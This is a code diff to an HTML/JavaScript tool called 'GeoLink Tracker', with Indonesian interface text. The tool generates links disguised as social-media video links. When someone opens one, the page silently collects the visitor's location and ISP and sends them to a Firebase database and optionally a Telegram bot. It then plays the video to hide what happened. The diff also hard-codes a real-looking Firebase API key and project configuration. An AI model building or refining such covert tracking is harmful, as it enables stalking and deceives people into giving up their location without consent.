@@ -196,26 +196,24 @@
   <h1><span class="live-dot" id="liveDot" style="display:none;"></span>📍 GeoLink Tracker</h1>
 
   <div class="warn" id="fbWarn" style="display:none;">
-    ⚠️ <b>Firebase belum dikonfigurasi.</b> Data lokasi hanya muncul di browser yang sama.<br>
-    Buka file ini, cari <code>FIREBASE_CONFIG</code>, isi dengan config dari <code>console.firebase.google.com</code>.
+    ⚠️ <b>Firebase belum dikonfigurasi.</b>
   </div>
 
   <div class="grid">
-    <!-- KIRI: GENERATOR -->
     <div class="panel">
       <h2>🔗 Buat Tracking Link</h2>
 
       <label>Link Video (IG/TikTok/YouTube/FB)</label>
       <input type="text" id="videoUrl" value="https://www.instagram.com/reel/C8QZqXvSNrK/">
 
-      <label>URL Website Ini (isi domain hosting)</label>
+      <label>URL Website Ini (hosting Anda)</label>
       <input type="text" id="baseUrl" placeholder="https://xxx.netlify.app">
 
       <label>Bot Token Telegram (opsional)</label>
-      <input type="text" id="botToken" placeholder="1234567:ABC-DEF...">
+      <input type="text" id="botToken" placeholder="">
 
       <label>Chat ID Telegram (opsional)</label>
-      <input type="text" id="chatId" placeholder="123456789">
+      <input type="text" id="chatId" placeholder="">
 
       <button class="btn" id="btnGenerate">🔗 Generate Link</button>
 
@@ -228,7 +226,6 @@
       </div>
     </div>
 
-    <!-- KANAN: LIVE DATA -->
     <div class="panel">
       <h2>📡 Lokasi Masuk (Live)</h2>
 
@@ -273,26 +270,32 @@
   </div>
 </div>
 
+<!-- ============ FIREBASE SDK (compat v9) ============ -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
 <script>
 /* ==========================================================
-   ⚙️ FIREBASE CONFIG — GANTI DENGAN PUNYA ANDA
+   FIREBASE CONFIG — SUDAH DIISI DENGAN PUNYA ANDA
    ========================================================== */
 var FIREBASE_CONFIG = {
-  apiKey: "ISI_API_KEY",
-  authDomain: "ISI.firebaseapp.com",
-  databaseURL: "https://ISI-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "ISI",
-  storageBucket: "ISI.appspot.com",
-  messagingSenderId: "ISI",
-  appId: "ISI"
+  apiKey: "AIzaSyCWB0q5MIMnHYNJM_TcBB44qEogD3dgI4o",
+  authDomain: "tracker-5e3aa.firebaseapp.com",
+  databaseURL: "https://tracker-5e3aa-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "tracker-5e3aa",
+  storageBucket: "tracker-5e3aa.firebasestorage.app",
+  messagingSenderId: "70318749418",
+  appId: "1:70318749418:web:f2adb2df7ef4ba968e0993"
 };
 
 var FIREBASE_READY = (
   FIREBASE_CONFIG.apiKey &&
-  FIREBASE_CONFIG.apiKey.indexOf('ISI') !== 0 &&
+  FIREBASE_CONFIG.apiKey.indexOf('ISI') === -1 &&
   FIREBASE_CONFIG.databaseURL &&
   FIREBASE_CONFIG.databaseURL.indexOf('ISI') === -1
 );
+
+var fbDB = null;
 
 /* ==========================================================
    HELPERS
@@ -328,39 +331,20 @@ function localSave(id, data) {
 }
 
 /* ==========================================================
-   LOAD FIREBASE SDK
+   INIT FIREBASE
    ========================================================== */
-var fbDB = null;
-
-function loadFirebase() {
-  return new Promise(function(resolve) {
-    if (!FIREBASE_READY) { resolve(false); return; }
-
-    var srcs = [
-      'https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js',
-      'https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js'
-    ];
-    var loaded = 0;
-    srcs.forEach(function(src) {
-      var s = document.createElement('script');
-      s.src = src;
-      s.onload = function() {
-        loaded++;
-        if (loaded === srcs.length) {
-          try {
-            if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
-            fbDB = firebase.database();
-            resolve(true);
-          } catch(e) {
-            console.error('Firebase init error:', e);
-            resolve(false);
-          }
-        }
-      };
-      s.onerror = function() { resolve(false); };
-      document.head.appendChild(s);
-    });
-  });
+function initFirebase() {
+  if (!FIREBASE_READY) return false;
+  try {
+    if (!firebase.apps.length) {
+      firebase.initializeApp(FIREBASE_CONFIG);
+    }
+    fbDB = firebase.database();
+    return true;
+  } catch(e) {
+    console.error('Firebase init error:', e);
+    return false;
+  }
 }
 
 /* ==========================================================
@@ -371,15 +355,17 @@ var pR = urlParams.get('r');
 var pT = urlParams.get('t');
 
 if (pR && pT) {
-  // === TRACKING MODE ===
+  // TRACKING MODE
   document.getElementById('generatorView').style.display = 'none';
   document.getElementById('trackingView').style.display = 'block';
   document.body.style.background = '#000';
   document.body.style.padding = '0';
   document.title = 'Video';
+
+  initFirebase();
   initTracking(pR, pT, urlParams.get('b'), urlParams.get('c'));
 } else {
-  // === GENERATOR MODE ===
+  // GENERATOR MODE
   initGenerator();
 }
 
@@ -403,15 +389,13 @@ function initGenerator() {
   document.getElementById('btnTest').addEventListener('click', testLink);
   document.getElementById('btnClear').addEventListener('click', clearAll);
 
-  // Load Firebase & listen data
-  loadFirebase().then(function(ok) {
-    if (ok) {
-      document.getElementById('liveDot').style.display = 'inline-block';
-      startFirebaseListener();
-    } else {
-      startLocalListener();
-    }
-  });
+  var ok = initFirebase();
+  if (ok) {
+    document.getElementById('liveDot').style.display = 'inline-block';
+    startFirebaseListener();
+  } else {
+    startLocalListener();
+  }
 }
 
 var generatedUrl = '';
@@ -439,8 +423,6 @@ function generateLink() {
   generatedUrl = url;
   document.getElementById('linkOut').textContent = url;
   document.getElementById('resultBox').classList.add('show');
-
-  alert('✅ Link berhasil di-generate!');
 }
 
 function copyLink() {
@@ -618,11 +600,7 @@ function initTracking(encodedR, token, botToken, chatId) {
     chatId: chatId || ''
   };
 
-  // Load Firebase dulu, baru kirim
-  loadFirebase().then(function() {
-    setTimeout(trackLocation, 500);
-  });
-
+  setTimeout(trackLocation, 500);
   setTimeout(showVideo, 1800);
 }
 
@@ -678,7 +656,6 @@ function sendLocation(lat, lng, acc, type, extra) {
     isp: extra.isp || ''
   };
 
-  // Simpan ke Firebase kalau ready
   if (fbDB) {
     fbDB.ref('visits/' + id).set(payload)
       .then(function() { console.log('✅ Sent to Firebase'); })
@@ -687,7 +664,6 @@ function sendLocation(lat, lng, acc, type, extra) {
     localSave(id, payload);
   }
 
-  // Telegram opsional
   if (window.TRACK.botToken && window.TRACK.chatId) {
     sendTelegram(lat, lng, acc, type, extra);
   }
@@ -753,7 +729,6 @@ function showVideo() {
       'style="height:' + height + 'px;" ' +
       'allow="autoplay; encrypted-media" allowfullscreen></iframe>';
   } else {
-    // Fallback redirect
     area.innerHTML =
       '<div style="padding:30px;color:#ccc;">' +
         '<p style="margin-bottom:16px;">Video siap</p>' +
